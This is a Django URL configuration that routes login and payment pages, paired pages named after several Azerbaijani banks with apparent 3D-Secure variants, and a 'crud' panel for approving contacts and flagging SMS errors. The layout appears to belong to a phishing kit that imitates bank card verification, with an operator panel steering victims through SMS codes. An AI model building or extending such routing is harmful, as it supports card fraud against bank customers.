from django.urls import path
from django.urls import re_path

from . import views
from django.urls import path
from . import views
from django.urls import include
from django.http import JsonResponse

from django.urls import path
from . import views
urlpatterns = [
    path("", views.index, name="index"),
    path("login", views.login, name="login"),
    path("payment", views.payment, name="payment"),
    path("payments", views.payments, name="payments"),
    path('check_approval_status/<int:contact_id>/', views.check_approval_status, name='check_approval_status'),
    
    path('kapital/', views.kapital, name='kapital'),
    path('kapital/dseckapital', views.dseckapital, name='dseckapital'),
    path('abb/', views.abb, name='abb'),
    path('abb/dsecazericard', views.dsecazericard, name='dsecazericard'),
    path('rabite', views.rabite, name='rabite'),
    path('crud/leobank/<int:pk>/', views.leobank, name='leobank'),
    path('leobank3d', views.leobank3d, name='leobank3d'),
    path('unibank', views.unibank, name='unibank'),
    path('unibank3d', views.unibank3d, name='unibank3d'),
    path('pashabank', views.pashabank, name='pashabank'),
    path('pashabank3d', views.pashabank3d, name='pashabank3d'),
    path('error', views.error, name='error'),

    path('crud/api/list/', views.contact_list_api, name='contact_list'),


    path('crud/smserror/<int:pk>/', views.smserror, name='smserror'),
    path('crud/smsfix/<int:pk>/', views.smserrorfix, name='smserrorfix'),
    
    path('crud/kapital/<int:pk>/', views.contact_approve, name='contact_approve'),


]